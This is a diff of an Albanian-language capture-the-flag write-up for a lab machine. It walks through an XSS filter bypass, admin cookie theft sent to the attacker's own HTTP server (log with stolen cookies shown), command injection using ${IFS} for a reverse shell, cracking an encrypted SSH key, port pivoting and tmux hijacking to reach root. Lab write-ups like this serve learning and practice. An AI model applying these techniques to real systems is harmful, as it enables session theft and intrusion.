@@ -130,14 +130,54 @@ Logohemi me kredencialet e gjetura dhe hyjme ne dashboard ku mund te krijojme po
 
 ![webapp_dashboard](https://github.com/zagnox/MisguidedGhosts/assets/144890045/c3c131f6-e3a1-494e-b2b8-5581ba297d34)
 
-9. Tentojme XSS dhe SSTI me burp intruder per te gjetur vulnerabilitete. Me burpsuite arrijme te dallojme nje xss qe eshte patchuar. Tentojme te shmangim filtrat dhe arrijme te gjejm nje payload qe funksionon.
-10. Hapi i rradhes eshte te kapim cookien e adminit duke derguar nje request drejt IP tone.
-11. Pasi kapim cookien dhe logohemi kryejme directory brute forcing dhe zbulojme /photos. Kur ngarkojme dicka shohim qe ne url kemi nje parameter te quajtur image. Duke tentuar per directory traversal dhe command injection disa komanda jane suksesshme.
-12. Kur tentojme te marrim nje reverse shell me command injection shohim se hapesirat filtrohen. Per te shmangur hapesirat perdorim ${IFS}.
-13. Pasi morem shellin gjetem disa file me instruksion dhe nje rsa key ne direkotrine e Zac. Celesi rsa per ssh eshte i koduar me cipher. Per te gjetur shifren e cipherit. Pas nje kerkimi ne google kuptojme qe celesat RSA fillojne ne shumicen e rasteve me 3 karaktere MII. Duke ditur kete informacion ne mund te tentojme te bejme brute force deri sa te gjejme cipherin qe perputhet me karakteret e celesit tone.
-14. Pasi kemi dekoduar celesin ne mund te hyjme me ssh si zac. Hapi tjeter eshte te eskalojme privilegjet ne root
-15. Pasi kryejme kerkim automartik me linpeas shohim qe portat 22 139 dhe 445 ne localhost jane hapur dhe smb lejon logim si anonim. Perodrim ligolo-ng per te bere forward gjithe portat lokale drejt attackboxit tone.
-16. Ne smb gjejme nje file me passworde te cilin e perodrim per te bere brute force ne ssh userit hayley. Pasi gjejme passwordin logohemi me ssh.
-17. Serish duke perdorur linpeas shohim se nje session i tmux mund te behet hijack si root. Shkruajme komanden dhe kemi nje tmux session si root.
+Tentojme XSS dhe SSTI me burp intruder per te gjetur vulnerabilitete. Me burpsuite arrijme te dallojme nje xss qe eshte patchuar. Tentojme te shmangim filtrat dhe arrijme te gjejme nje payload qe funksionon.
+
+![burp_bugXSS](https://github.com/zagnox/MisguidedGhosts/assets/144890045/74dd6b91-2b6c-4721-b132-b641c145e8dd)
+
+![xss_Pwn3d](https://github.com/zagnox/MisguidedGhosts/assets/144890045/78053456-037c-47d7-955a-ba5e3218980d)
+
+10. Duke qene se webi eshte vulnerabel ndaj XSS hapi i rradhes eshte te kapim cookien e adminit dhe ta dergojme me nje request drejt IP tone.
+
+```
+python -m http.server 9001
+Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
+10.14.75.118 - - [16/Apr/2024 23:55:32] code 404, message File not found
+10.14.75.118 - - [16/Apr/2024 23:55:32] "GET /XSS/grabber.php?c=login=zac_from_paramore HTTP/1.1" 404 -
+10.10.132.38 - - [16/Apr/2024 23:55:56] code 404, message File not found
+10.10.132.38 - - [16/Apr/2024 23:55:56] "GET /XSS/grabber.php?c=login=hayley_is_admin HTTP/1.1" 404 -
+```
+![hayley_login](https://github.com/zagnox/MisguidedGhosts/assets/144890045/1bcda59c-1eb7-44ee-bb6b-a121308d15a2)
+
+Me cookien qe kapem mund te logohemi dhe kryejme directory brute forcing dhe zbulojme /photos. Kur ngarkojme dicka shohim qe ne url kemi nje parameter te quajtur image. Duke tentuar per directory traversal dhe command injection dallojme disa komanda te suksesshme.
+```
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://10.10.132.38:8080/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Cookies:                 login=hayley_is_admin
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+/photos
+```
+
+![command_injection](https://github.com/zagnox/MisguidedGhosts/assets/144890045/0774ed2c-e207-4fbb-9fd8-491d10564736)
+
+Kur tentojme te marrim nje reverse shell me command injection shohim qe hapesirat filtrohen. Per te shmangur hapesirat perdorim ${IFS}
+![no_space_cmd_injection](https://github.com/zagnox/MisguidedGhosts/assets/144890045/acc8304a-9cbd-42cd-9fd9-c595c8fee6bf)
+
+14. Pasi morem shellin gjetem disa file me instruksion dhe nje rsa key ne direkotrine e Zac. Celesi rsa per ssh eshte i koduar me cipher. Per te gjetur shifren e cipherit. Pas nje kerkimi ne google kuptojme qe celesat RSA fillojne ne shumicen e rasteve me 3 karaktere MII. Duke ditur kete informacion ne mund te tentojme te bejme brute force deri sa te gjejme cipherin qe perputhet me karakteret e celesit tone.
+15. Pasi kemi dekoduar celesin ne mund te hyjme me ssh si zac. Hapi tjeter eshte te eskalojme privilegjet ne root
+16. Pasi kryejme kerkim automartik me linpeas shohim qe portat 22 139 dhe 445 ne localhost jane hapur dhe smb lejon logim si anonim. Perodrim ligolo-ng per te bere forward gjithe portat lokale drejt attackboxit tone.
+17. Ne smb gjejme nje file me passworde te cilin e perodrim per te bere brute force ne ssh userit hayley. Pasi gjejme passwordin logohemi me ssh.
+18. Serish duke perdorur linpeas shohim se nje session i tmux mund te behet hijack si root. Shkruajme komanden dhe kemi nje tmux session si root.
 
 
